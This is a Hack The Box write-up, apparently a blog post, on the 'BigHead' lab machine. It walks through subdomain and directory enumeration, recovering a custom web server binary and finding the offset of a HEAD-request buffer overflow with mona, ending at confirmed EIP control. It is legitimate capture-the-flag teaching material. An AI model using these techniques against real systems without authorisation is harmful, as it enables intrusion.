<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.5.0 -->
<title>Hack The Box - BigHead | 0xRick</title>
<meta name="generator" content="Jekyll v3.8.5" />
<meta property="og:title" content="Hack The Box - BigHead" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="My write-up / walkthrough for BigHead from Hack The Box." />
<meta property="og:description" content="My write-up / walkthrough for BigHead from Hack The Box." />
<link rel="canonical" href="https://0xrick.github.io/hack-the-box/bighead/" />
<meta property="og:url" content="https://0xrick.github.io/hack-the-box/bighead/" />
<meta property="og:site_name" content="0xRick" />
<meta property="og:image" content="https://0xrick.github.io/hackthebox/bighead/0.png" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2019-05-04T00:00:00+02:00" />
<script type="application/ld+json">
{"description":"My write-up / walkthrough for BigHead from Hack The Box.","@type":"BlogPosting","url":"https://0xrick.github.io/hack-the-box/bighead/","image":"https://0xrick.github.io/hackthebox/bighead/0.png","headline":"Hack The Box - BigHead","dateModified":"2019-05-04T00:00:00+02:00","datePublished":"2019-05-04T00:00:00+02:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://0xrick.github.io/hack-the-box/bighead/"},"@context":"http://schema.org"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/css/ad.css">
  <link rel="stylesheet" href="/assets/css/style.css">
  <link rel="icon" type="image/png" href="/assets/favicon.png" /><link type="application/atom+xml" rel="alternate" href="https://0xrick.github.io/feed.xml" title="0xRick" /><script defer src="https://use.fontawesome.com/releases/v5.8.1/js/all.js" integrity="sha384-g5uSoOSBd7KkhAMlnQILrecXvzst9TdC09/VM+pjDTCM+1il8RHz5fKANTFFb+gQ" crossorigin="anonymous"></script>
</head><!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-97164925-2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-97164925-2');
</script>

<body><div class="site-header">
  <div class="wrapper">
    <a class="site-title" rel="author" href="/">0xRick<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
    <span class="social_links">
        <a class="color-cyan-hover" href="https://twitter.com/Ahm3d_H3sham/" target="_blank" rel="noopener noreferrer"><i class="fab fa-twitter"></i></a><a class="color-blue-hover" href="https://facebook.com/Ahm3d.H3sham/" target="_blank" rel="noopener noreferrer"><i class="fab fa-facebook"></i></a><a class="color-purple-hover" href="https://github.com/0xRick" target="_blank" rel="noopener noreferrer"><i class="fab fa-github"></i></a><a class="color-orange-hover" href="https://www.reddit.com/user/Ahm3d_H3sham" target="_blank" rel="noopener noreferrer"><i class="fab fa-reddit"></i></a><a class="color-cyan-hover" href="https://discordapp.com/users/332196573771595777" target="_blank" rel="noopener noreferrer"><i class="fab fa-discord"></i></a>
        <a class="color-red-hover" href="mailto:x0rick@protonmail.com"><i class="fa fa-envelope"></i></a>
    </span>
  </div>
</div>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <div class="author-box">
<img src="/avatar.jpg" width="256px" height="256px" class="author-avatar" onclick="window.open('https://www.hackthebox.eu/profile/65598','_blank');">
<h7>
	Ahmed Hesham<br>
	CyberSec/InfoSec enthusiast. <br>
	Interested in knowing how things work/Interested in breaking them, always learning.
</h7>
</div>

  <br>
<div>
	<h7>    Ad </h7>
	<script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&amp;placement=0xrickgithubio" id="_carbonads_js"></script>
</div>
<div class="post">
  <h1 class="post-title">Hack The Box - BigHead</h1>
  
  <div class="post-tags">
      
      <a class="tag" href="/tag/windows/">windows</a>
      
      <a class="tag" href="/tag/web/">web</a>
      
      <a class="tag" href="/tag/reverse-engineering/">reverse-engineering</a>
      
      <a class="tag" href="/tag/egghunting/">egghunting</a>
      
      <a class="tag" href="/tag/buffer-overflow/">buffer-overflow</a>
      
      <a class="tag" href="/tag/windows-exploitation/">windows-exploitation</a>
      
      <a class="tag" href="/tag/exploit-development/">exploit-development</a>
      
      <a class="tag" href="/tag/lfi/">lfi</a>
      
      <a class="tag" href="/tag/rce/">rce</a>
      
      <a class="tag" href="/tag/forensics/">forensics</a>
      
      <a class="tag" href="/tag/networking/">networking</a>
      
      <a class="tag" href="/tag/pivoting/">pivoting</a>
      
      <a class="tag" href="/tag/ssh/">ssh</a>
      
      <a class="tag" href="/tag/code-analysis/">code-analysis</a>
      
      <a class="tag" href="/tag/python/">python</a>
      
      <a class="tag" href="/tag/php/">php</a>
      
  </div>
  
  <div class="post-date">Published on 04 May 2019</div>
  
  <div class="post-description">My write-up / walkthrough for BigHead from Hack The Box.</div>
  
  <hr>

<h2 id="quick-summary">Quick Summary</h2>
<p><br> Hey guys, Today BigHead retired and here’s my write-up about it. As you can see it’s an insane box, actually it’s hard to summarize this box as it included a lot of steps to achieve different goals. Most of the steps require deep enumeration especially the initial foothold. The part I liked the most about this box is the win32 buffer overflow egghunting exploitation as it was very interesting. The whole box was challenging and the overall experience wasn’t bad, But I disliked the fact that it had a lot of trolls. I found it kinda funny that the box had a lot of <a href="https://www.imdb.com/title/tt2575988/" target="_blank" rel="noopener noreferrer">Silicon Valley</a> references :D even the name of the box is the name of one of the characters, Anyway let’s not waste more time. It’s a windows box and its ip is <code class="highlighter-rouge">10.10.10.112</code>. I added it to <code class="highlighter-rouge">/etc/hosts</code> as <code class="highlighter-rouge">bighead.htb</code>. Let’s jump right in !
<br><img src="/images/hackthebox/bighead/0.png" alt=""><br></p>
<hr>

<h2 id="nmap">Nmap</h2>
<p><br> As always we will start with nmap to scan for open ports and services :
<br><code class="highlighter-rouge">nmap -sV -sT -sC bighead.htb</code>
<br><img src="/images/hackthebox/bighead/1.png" alt=""><br>
<br> Only one port is open which is port 80 and it’s running http. Let’s take a look.
<br></p>
<hr>

<h2 id="http-enumeration">HTTP Enumeration</h2>
<p><br><img src="/images/hackthebox/bighead/2.png" alt=""><br>
<br> It’s a website titled <code class="highlighter-rouge">PiperNet Comes</code>. The background is an image of the characters from the TV show “Silicon Valley”, and in the middle it’s saying <code class="highlighter-rouge">PIPERNET IS HERE</code>. Also there are two links down there, First one is <code class="highlighter-rouge">THIS IS PIPERNET</code> which is the homepage and the other one is <code class="highlighter-rouge">PIEDPIPERCOIN</code>. Let’s scroll down and see what else do we have :
<br><img src="/images/hackthebox/bighead/3.png" alt=""><br>
<br> <code class="highlighter-rouge">PIEDPIPERCOIN COMES</code>, and there’s a small description of what piedpipercoin is. 
<br><img src="/images/hackthebox/bighead/4.png" alt=""><br>
<br><img src="/images/hackthebox/bighead/5.png" alt=""><br>
<br><img src="/images/hackthebox/bighead/6.png" alt=""><br>
<br> After that there are some pictures for the characters from “Silicon Valley” and some stuff about each one of them, Nothing is interesting so far. At the bottom of the page there is this contact form :
<br><img src="/images/hackthebox/bighead/7.png" alt=""><br>
<br> I looked at the contact info and I noticed that the email was <code class="highlighter-rouge">info@bachmanity.htb</code>. Let’s check that domain, but before doing that I wanted to check the other page <code class="highlighter-rouge">PIEDPIPERCOIN</code> :
<br><img src="/images/hackthebox/bighead/8.png" alt=""><br>
<br> Instead of <code class="highlighter-rouge">PIEDPIPERCOIN COMES</code> it’s saying <code class="highlighter-rouge">PIEDPIPERCOIN CAME</code> but nothing is interesting. Let’s check <code class="highlighter-rouge">bachmanity.htb</code>, we need to add it to <code class="highlighter-rouge">/etc/hosts</code> first :
<br><img src="/images/hackthebox/bighead/9.png" alt=""><br>
<br><code class="highlighter-rouge">bachmanity.htb</code>
<br><img src="/images/hackthebox/bighead/10.png" alt=""><br>
<br> It’s only that image and nothing else :
<br><img src="/images/hackthebox/bighead/11.png" alt=""><br>
<br> Back to the contact form, I wanted to see if it’s exploitable in any way. I filled all the fields with <code class="highlighter-rouge">test</code> :
<br><img src="/images/hackthebox/bighead/12.png" alt=""><br>
<br><img src="/images/hackthebox/bighead/13.png" alt=""><br>
<br> It sends the request to <code class="highlighter-rouge">mailer.bighead.htb</code>, Let’s add it to <code class="highlighter-rouge">/etc/hosts</code> and try again :
<br><img src="/images/hackthebox/bighead/14.png" alt=""><br>
<br><img src="/images/hackthebox/bighead/15.png" alt=""><br>
<br> It shows this message then it redirects the browser back to <code class="highlighter-rouge">bighead.htb</code>. I also intercepted the request with burp :
<br><img src="/images/hackthebox/bighead/16.png" alt=""><br>
<br><img src="/images/hackthebox/bighead/17.png" alt=""><br>
<br> Tried to manipulate the input, but couldn’t achieve anything. I went to <code class="highlighter-rouge">mailer.bighead.htb</code> and got redirected to <code class="highlighter-rouge">mailer.bighead.htb/testlink</code> which shows this error :
<br><img src="/images/hackthebox/bighead/18.png" alt=""><br>
<br><img src="/images/hackthebox/bighead/19.png" alt=""><br>
<br> In the background I ran <code class="highlighter-rouge">gobuster</code> on <code class="highlighter-rouge">bachmanity.htb</code>  and <code class="highlighter-rouge">bighead.htb</code> with <code class="highlighter-rouge">/usr/share/wordlists/dirb/common.txt</code>. <code class="highlighter-rouge">bachmanity.htb</code> didn’t have anything :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://bachmanity.htb/
[+] Threads      : 100
[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 2m0s
=====================================================
2019/04/24 20:21:01 Starting gobuster
=====================================================
/index.html (Status: 200)
/index.htm (Status: 200)
</code></pre></div></div>
<p><br> but <code class="highlighter-rouge">bighead.htb</code> gave some results :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://bighead.htb/
[+] Threads      : 100
[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 2m0s
=====================================================
2019/04/24 20:16:23 Starting gobuster
=====================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/assets (Status: 301)
/backend (Status: 302)
/Images (Status: 301)
/images (Status: 301)
/index.html (Status: 200)
</code></pre></div></div>
<p><br> I went to <code class="highlighter-rouge">/assets</code> and it was forbidden :
<br><img src="/images/hackthebox/bighead/20.png" alt=""><br>
<br> <code class="highlighter-rouge">/backend</code> redirected the browser to <code class="highlighter-rouge">bighead.htb/BigHead</code> which gave the same error we saw before :
<br><img src="/images/hackthebox/bighead/21.png" alt=""><br>
<br><img src="/images/hackthebox/bighead/22.png" alt=""><br>
<br> I clicked on <code class="highlighter-rouge">error log</code> and it gave the same error :
<br><img src="/images/hackthebox/bighead/23.png" alt=""><br>
<br> Let’s check if there are any other subdomains. I used <code class="highlighter-rouge">wfuzz</code> with <a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/subdomains-top1mil-5000.txt" target="_blank" rel="noopener noreferrer">subdomains-top1mil-5000.txt</a> from <a href="https://github.com/danielmiessler/SecLists" target="_blank" rel="noopener noreferrer">seclists</a>:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz -c -w subdomains-top1mil-5000.txt -H "HOST: FUZZ.bighead.htb" http://10.10.10.112
</code></pre></div></div>
<p><br><img src="/images/hackthebox/bighead/24.png" alt=""><br>
<br> non-valid subdomain responses are <code class="highlighter-rouge">11232</code> chars so we will remove those from the output :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz -c --hh 11232 -w subdomains-top1mil-5000.txt -H "HOST: FUZZ.bighead.htb" http://10.10.10.112
</code></pre></div></div>
<p><br><img src="/images/hackthebox/bighead/25.png" alt=""><br>
<br> We got 3 subdomains : <code class="highlighter-rouge">dev</code>, <code class="highlighter-rouge">mailer</code> and <code class="highlighter-rouge">code</code>. We already know about <code class="highlighter-rouge">mailer</code>, let’s add <code class="highlighter-rouge">dev</code> and <code class="highlighter-rouge">code</code> :
<br><img src="/images/hackthebox/bighead/26.png" alt=""><br>
<br> <code class="highlighter-rouge">code.bighead.htb</code> redirected the browser to <code class="highlighter-rouge">127.0.0.1:5080/testlink/login.php</code>
<br><img src="/images/hackthebox/bighead/27.png" alt=""><br>
<br><img src="/images/hackthebox/bighead/28.png" alt=""><br>
<br> So to see what’s on <code class="highlighter-rouge">code.bighead.htb</code> we will probably need to forward an internal service to our box. We can’t do that now so we will ignore <code class="highlighter-rouge">code.bighead.htb</code> for now.
<br> <code class="highlighter-rouge">dev.bighead.htb</code> shows this image of bighead :
<br><img src="/images/hackthebox/bighead/29.png" alt=""><br>
<br> Source has nothing interesting :
<br><img src="/images/hackthebox/bighead/30.png" alt=""><br>
<br> I ran <code class="highlighter-rouge">gobuster</code> again and got some results :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://dev.bighead.htb/
[+] Threads      : 100
[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 2m0s
=====================================================
2019/04/24 20:55:05 Starting gobuster
=====================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/blog (Status: 302)
/blog_ajax (Status: 302)
/blog_inlinemod (Status: 302)
/blog_usercp (Status: 302)
/blog_search (Status: 302)
/blog_report (Status: 302)
/blogger (Status: 302)
/blogindex (Status: 302)
/bloggers (Status: 302)
/blogs (Status: 302)
/blogspot (Status: 302)
/wp-content (Status: 302)
</code></pre></div></div>
<p><br> But all these pages gave this result :
<br><img src="/images/hackthebox/bighead/31.png" alt=""><br>
<br> I intercepted the request in burp to figure out why :
<br><img src="/images/hackthebox/bighead/32.png" alt=""><br>
<br><img src="/images/hackthebox/bighead/33.png" alt=""><br>
<br> The response is <code class="highlighter-rouge">302</code>, by following the redirect :
<br><img src="/images/hackthebox/bighead/34.png" alt=""><br>
<br> It responds with another <code class="highlighter-rouge">302</code>
<br><img src="/images/hackthebox/bighead/35.png" alt=""><br>
<br> So it will keep redirecting us in a loop and we won’t get anything.
<br> At this point I didn’t know what to do because all of my attempts have hit a dead end. I did a sub directory bruteforce again with <code class="highlighter-rouge">wfuzz</code> instead of <code class="highlighter-rouge">gobuster</code> and I got one more result :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz --hc 404 -c -w /usr/share/wordlists/dirb/common.txt -u http://dev.bighead.htb/FUZZ
</code></pre></div></div>
<p><br><img src="/images/hackthebox/bighead/36.png" alt=""><br>
<br> The reason why <code class="highlighter-rouge">gobuster</code> didn’t show us this page is because of the status code. <code class="highlighter-rouge">gobuster</code> only showed results with these status codes : <code class="highlighter-rouge">[+] Status codes : 200,204,301,302,307,403</code>, While <code class="highlighter-rouge">wfuzz</code> showed everything except <code class="highlighter-rouge">404</code> responses, <code class="highlighter-rouge">--hc 404</code>. <code class="highlighter-rouge">/coffee</code> gave a response of <code class="highlighter-rouge">418</code> which is weird. I looked it up and found some info about it <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/418" target="_blank" rel="noopener noreferrer">here</a>. <code class="highlighter-rouge">418 I'm a teapot</code> ! Anyway let’s take a look :
<br><code class="highlighter-rouge">http://dev.bighead.htb/coffee</code>
<br><img src="/images/hackthebox/bighead/37.png" alt=""><br>
<br> It’s showing this <code class="highlighter-rouge">gif</code> :
<br><img src="/images/hackthebox/bighead/teapot.gif" alt="">
<br> Which is saying : “The requested entity body is short and stout. Tip me over and pour me out.” ?!
<br> I intercepted the request with burp and looked at the response :
<br><img src="/images/hackthebox/bighead/38.png" alt=""><br>
<br><img src="/images/hackthebox/bighead/39.png" alt=""><br>
<br> I noticed a weird server name : <code class="highlighter-rouge">BigheadWebSvr 1.0</code>. I looked it up and found a repository on the machine creator’s github (3mrgnc3) :
<br><img src="/images/hackthebox/bighead/40.png" alt=""><br>
<br> I searched through the commits and got <a href="https://github.com/3mrgnc3/BigheadWebSvr/blob/b1b4d6ed5f2298bc243cd56cab77cd6fb4e48c3d/BHWS_Backup.zip" target="_blank" rel="noopener noreferrer">this one</a> which seemed to be the right one.
<br><img src="/images/hackthebox/bighead/41.png" alt=""><br>
<br> It asked for a password :
<br><img src="/images/hackthebox/bighead/42.png" alt=""><br>
<br> I tried to guess it and after some attempts <code class="highlighter-rouge">bighead</code> worked :
<br><img src="/images/hackthebox/bighead/43.png" alt=""><br>
<br><img src="/images/hackthebox/bighead/44.png" alt=""><br>
<br><img src="/images/hackthebox/bighead/45.png" alt=""><br>
<br> Of course it’s a windows executable so we will switch to a windows machine. At this point the hint was quite obvious : “The requested entity body is short and stout. Tip me over and pour me out.”, This server is probably vulnerable to a buffer overflow.
<br></p>
<hr>

<h2 id="buffer-overflow-in-bigheadwebsvr">Buffer Overflow in <code class="highlighter-rouge">BigheadWebSvr</code>
</h2>
<p><br> I tried to run the server but it complained about some missing <code class="highlighter-rouge">dll</code> called <code class="highlighter-rouge">libmingwex-0.dll</code> :
<br><img src="/images/hackthebox/bighead/46.png" alt=""><br>
<br>  So I installed <a href="https://osdn.net/projects/mingw/releases/" target="_blank" rel="noopener noreferrer">mingw</a> and copied the <code class="highlighter-rouge">dll</code> to the same directory as the server :
<br><img src="/images/hackthebox/bighead/47.png" alt=""><br>
<br> Then I had to allow access for it :
<br><img src="/images/hackthebox/bighead/48.png" alt=""><br>
<br> Now the server is running :
<br><img src="/images/hackthebox/bighead/49.png" alt=""><br>
<br> But not on port 80 :
<br><img src="/images/hackthebox/bighead/50.png" alt=""><br>
<br> I did <code class="highlighter-rouge">netstat -a -b</code> and found that it’s running on port 8008 :
<br><img src="/images/hackthebox/bighead/51.png" alt=""><br>
<br><img src="/images/hackthebox/bighead/52.png" alt=""><br>
<br><img src="/images/hackthebox/bighead/53.png" alt=""><br>
<br> Great, I intercepted the request with burp then I ran the server again with <a href="https://www.immunityinc.com/products/debugger/" target="_blank" rel="noopener noreferrer">Immunity Debugger</a> :
<br><img src="/images/hackthebox/bighead/54.png" alt=""><br>
<br><img src="/images/hackthebox/bighead/55.png" alt=""><br>
<br> Now we need to know how to make the server crash. First thing I wanted to try was sending a HEAD request, because you know … the machine name is BigHead :D
<br><img src="/images/hackthebox/bighead/56.png" alt=""><br>
<br><img src="/images/hackthebox/bighead/57.png" alt=""><br>
<br> And yes it worked. The EIP was overwritten with A. I tried to send a bigger request and the server didn’t crash, and that was a bit of a problem because we are limited to a specific size so we don’t have enough space to store our shellcode, That’s why we will use egghunting. There are a lot of great tutorials about win32 egghunting out there so I will just give you an idea of what is egghunting in case you don’t know. When we don’t have enough space on the stack to hold the shellcode, instead of sending and executing the shellcode we send a very small string called egghunter. When that egghunter is executed it searches through the entire memory for an egg. when it hits that egg it executes what’s after it (the shellcode). The egg is a 4-bytes string, say for example <code class="highlighter-rouge">R1ck</code> that egg is doubled and added before the shellcode like this : <code class="highlighter-rouge">R1ckR1ck + shellcode</code>. It’s explained very well in skape’s paper <a href="http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf" target="_blank" rel="noopener noreferrer">Safely Searching Process Virtual Address Space</a>. There are also many practical tutorials just search for win32 egghunting. 
<br> Now back to the vulnerable server, first thing we need to know is the offset. I’m using <a href="https://github.com/corelan/mona" target="_blank" rel="noopener noreferrer">mona plugin</a>. <a href="https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/" target="_blank" rel="noopener noreferrer">Documentation</a>.</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>!mona config -set workingfolder c:\logs\%p`, to make `mona` output to `C:\logs
</code></pre></div></div>
<p><br><img src="/images/hackthebox/bighead/58.png" alt=""><br>
<br> To find the offset we will create a pattern <code class="highlighter-rouge">!mona pc 100</code> (creates a pattern of 100 chars), this is the same as <code class="highlighter-rouge">pattern_create.rb</code> from <code class="highlighter-rouge">metasploit</code>. I used it in my <a href="/categories/#binary-exploitation">buffer overflow write-ups</a>.
<br><img src="/images/hackthebox/bighead/59.png" alt=""><br>
<br> It will put the output in a file called <code class="highlighter-rouge">pattern.txt</code> in <code class="highlighter-rouge">C:\logs</code> :
<br><img src="/images/hackthebox/bighead/60.png" alt=""><br>
<br> Pattern :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
</code></pre></div></div>
<p><br><img src="/images/hackthebox/bighead/61.png" alt=""><br>
<br> Full output :</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">================================================================================</span>
  <span class="n">Output</span> <span class="n">generated</span> <span class="n">by</span> <span class="n">mona</span><span class="p">.</span><span class="n">py</span> <span class="n">v2</span><span class="p">.</span><span class="mi">0</span><span class="p">,</span> <span class="n">rev</span> <span class="mi">585</span> <span class="o">-</span> <span class="n">Immunity</span> <span class="n">Debugger</span>
  <span class="n">Corelan</span> <span class="n">Team</span> <span class="o">-</span> <span class="n">https</span><span class="o">:</span><span class="c1">//www.corelan.be
</span><span class="o">================================================================================</span>
  <span class="n">Process</span> <span class="n">being</span> <span class="n">debugged</span> <span class="o">:</span> <span class="n">BigheadWebSvr</span> <span class="p">(</span><span class="n">pid</span> <span class="mi">1300</span><span class="p">)</span>
  <span class="n">Current</span> <span class="n">mona</span> <span class="n">arguments</span><span class="o">:</span> <span class="n">pc</span> <span class="mi">100</span>
<span class="o">================================================================================</span>
  <span class="mi">2019</span><span class="o">-</span><span class="mo">04</span><span class="o">-</span><span class="mi">24</span> <span class="mi">22</span><span class="o">:</span><span class="mi">43</span><span class="o">:</span><span class="mi">44</span>
<span class="o">================================================================================</span>

<span class="n">Pattern</span> <span class="n">of</span> <span class="mi">100</span> <span class="n">bytes</span> <span class="o">:</span>
<span class="o">----------------------</span>

<span class="n">ASCII</span><span class="o">:</span>
<span class="n">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A</span>

<span class="n">HEX</span><span class="o">:</span>
<span class="err">\</span><span class="n">x41</span><span class="err">\</span><span class="n">x61</span><span class="err">\</span><span class="n">x30</span><span class="err">\</span><span class="n">x41</span><span class="err">\</span><span class="n">x61</span><span class="err">\</span><span class="n">x31</span><span class="err">\</span><span class="n">x41</span><span class="err">\</span><span class="n">x61</span><span class="err">\</span><span class="n">x32</span><span class="err">\</span><span class="n">x41</span><span class="err">\</span><span class="n">x61</span><span class="err">\</span><span class="n">x33</span><span class="err">\</span><span class="n">x41</span><span class="err">\</span><span class="n">x61</span><span class="err">\</span><span class="n">x34</span><span class="err">\</span><span class="n">x41</span><span class="err">\</span><span class="n">x61</span><span class="err">\</span><span class="n">x35</span><span class="err">\</span><span class="n">x41</span><span class="err">\</span><span class="n">x61</span><span class="err">\</span><span class="n">x36</span><span class="err">\</span><span class="n">x41</span><span class="err">\</span><span class="n">x61</span><span class="err">\</span><span class="n">x37</span><span class="err">\</span><span class="n">x41</span><span class="err">\</span><span class="n">x61</span><span class="err">\</span><span class="n">x38</span><span class="err">\</span><span class="n">x41</span><span class="err">\</span><span class="n">x61</span><span class="err">\</span><span class="n">x39</span><span class="err">\</span><span class="n">x41</span><span class="err">\</span><span class="n">x62</span><span class="err">\</span><span class="n">x30</span><span class="err">\</span><span class="n">x41</span><span class="err">\</span><span class="n">x62</span><span class="err">\</span><span class="n">x31</span><span class="err">\</span><span class="n">x41</span><span class="err">\</span><span class="n">x62</span><span class="err">\</span><span class="n">x32</span><span class="err">\</span><span class="n">x41</span><span class="err">\</span><span class="n">x62</span><span class="err">\</span><span class="n">x33</span><span class="err">\</span><span class="n">x41</span><span class="err">\</span><span class="n">x62</span><span class="err">\</span><span class="n">x34</span><span class="err">\</span><span class="n">x41</span><span class="err">\</span><span class="n">x62</span><span class="err">\</span><span class="n">x35</span><span class="err">\</span><span class="n">x41</span><span class="err">\</span><span class="n">x62</span><span class="err">\</span><span class="n">x36</span><span class="err">\</span><span class="n">x41</span><span class="err">\</span><span class="n">x62</span><span class="err">\</span><span class="n">x37</span><span class="err">\</span><span class="n">x41</span><span class="err">\</span><span class="n">x62</span><span class="err">\</span><span class="n">x38</span><span class="err">\</span><span class="n">x41</span><span class="err">\</span><span class="n">x62</span><span class="err">\</span><span class="n">x39</span><span class="err">\</span><span class="n">x41</span><span class="err">\</span><span class="n">x63</span><span class="err">\</span><span class="n">x30</span><span class="err">\</span><span class="n">x41</span><span class="err">\</span><span class="n">x63</span><span class="err">\</span><span class="n">x31</span><span class="err">\</span><span class="n">x41</span><span class="err">\</span><span class="n">x63</span><span class="err">\</span><span class="n">x32</span><span class="err">\</span><span class="n">x41</span><span class="err">\</span><span class="n">x63</span><span class="err">\</span><span class="n">x33</span><span class="err">\</span><span class="n">x41</span><span class="err">\</span><span class="n">x63</span><span class="err">\</span><span class="n">x34</span><span class="err">\</span><span class="n">x41</span><span class="err">\</span><span class="n">x63</span><span class="err">\</span><span class="n">x35</span><span class="err">\</span><span class="n">x41</span><span class="err">\</span><span class="n">x63</span><span class="err">\</span><span class="n">x36</span><span class="err">\</span><span class="n">x41</span><span class="err">\</span><span class="n">x63</span><span class="err">\</span><span class="n">x37</span><span class="err">\</span><span class="n">x41</span><span class="err">\</span><span class="n">x63</span><span class="err">\</span><span class="n">x38</span><span class="err">\</span><span class="n">x41</span><span class="err">\</span><span class="n">x63</span><span class="err">\</span><span class="n">x39</span><span class="err">\</span><span class="n">x41</span><span class="err">\</span><span class="n">x64</span><span class="err">\</span><span class="n">x30</span><span class="err">\</span><span class="n">x41</span><span class="err">\</span><span class="n">x64</span><span class="err">\</span><span class="n">x31</span><span class="err">\</span><span class="n">x41</span><span class="err">\</span><span class="n">x64</span><span class="err">\</span><span class="n">x32</span><span class="err">\</span><span class="n">x41</span>


<span class="n">JAVASCRIPT</span> <span class="p">(</span><span class="n">unescape</span><span class="p">()</span> <span class="n">friendly</span><span class="p">)</span><span class="o">:</span>
<span class="o">%</span><span class="n">u6141</span><span class="o">%</span><span class="n">u4130</span><span class="o">%</span><span class="n">u3161</span><span class="o">%</span><span class="n">u6141</span><span class="o">%</span><span class="n">u4132</span><span class="o">%</span><span class="n">u3361</span><span class="o">%</span><span class="n">u6141</span><span class="o">%</span><span class="n">u4134</span><span class="o">%</span><span class="n">u3561</span><span class="o">%</span><span class="n">u6141</span><span class="o">%</span><span class="n">u4136</span><span class="o">%</span><span class="n">u3761</span><span class="o">%</span><span class="n">u6141</span><span class="o">%</span><span class="n">u4138</span><span class="o">%</span><span class="n">u3961</span><span class="o">%</span><span class="n">u6241</span><span class="o">%</span><span class="n">u4130</span><span class="o">%</span><span class="n">u3162</span><span class="o">%</span><span class="n">u6241</span><span class="o">%</span><span class="n">u4132</span><span class="o">%</span><span class="n">u3362</span><span class="o">%</span><span class="n">u6241</span><span class="o">%</span><span class="n">u4134</span><span class="o">%</span><span class="n">u3562</span><span class="o">%</span><span class="n">u6241</span><span class="o">%</span><span class="n">u4136</span><span class="o">%</span><span class="n">u3762</span><span class="o">%</span><span class="n">u6241</span><span class="o">%</span><span class="n">u4138</span><span class="o">%</span><span class="n">u3962</span><span class="o">%</span><span class="n">u6341</span><span class="o">%</span><span class="n">u4130</span><span class="o">%</span><span class="n">u3163</span><span class="o">%</span><span class="n">u6341</span><span class="o">%</span><span class="n">u4132</span><span class="o">%</span><span class="n">u3363</span><span class="o">%</span><span class="n">u6341</span><span class="o">%</span><span class="n">u4134</span><span class="o">%</span><span class="n">u3563</span><span class="o">%</span><span class="n">u6341</span><span class="o">%</span><span class="n">u4136</span><span class="o">%</span><span class="n">u3763</span><span class="o">%</span><span class="n">u6341</span><span class="o">%</span><span class="n">u4138</span><span class="o">%</span><span class="n">u3963</span><span class="o">%</span><span class="n">u6441</span><span class="o">%</span><span class="n">u4130</span><span class="o">%</span><span class="n">u3164</span><span class="o">%</span><span class="n">u6441</span><span class="o">%</span><span class="n">u4132</span>
</code></pre></div></div>
<p><br> Let’s send the pattern :
<br><img src="/images/hackthebox/bighead/62.png" alt=""><br>
<br><img src="/images/hackthebox/bighead/63.png" alt=""><br>
<br> the EIP was overwritten with <code class="highlighter-rouge">ACC54AAC</code>, <code class="highlighter-rouge">!mona findmsp</code> should give us the offset but for some reason it wasn’t able to find it so I did it manually. We will reverse <code class="highlighter-rouge">ACC54AAC</code> because it’s <a href="http://chortle.ccsu.edu/assemblytutorial/Chapter-15/ass15_3.html" target="_blank" rel="noopener noreferrer">little endian</a>, so it will be <code class="highlighter-rouge">AC4AC5AC</code>. I located it then I used python’s function <code class="highlighter-rouge">len()</code> to find the length of the string before <code class="highlighter-rouge">AC4AC5AC</code> :
<br><img src="/images/hackthebox/bighead/64.png" alt=""><br>
<br><img src="/images/hackthebox/bighead/65.png" alt=""><br>
<br> Offset is 72, let’s confirm that. I sent 72 A’s then 8 B’s :
<br><img src="/images/hackthebox/bighead/66.png" alt=""><br>
<br> And I could successfully overwrite EIP with B : 
<br><img src="/images/hackthebox/bighead/67.png" alt=""><br>
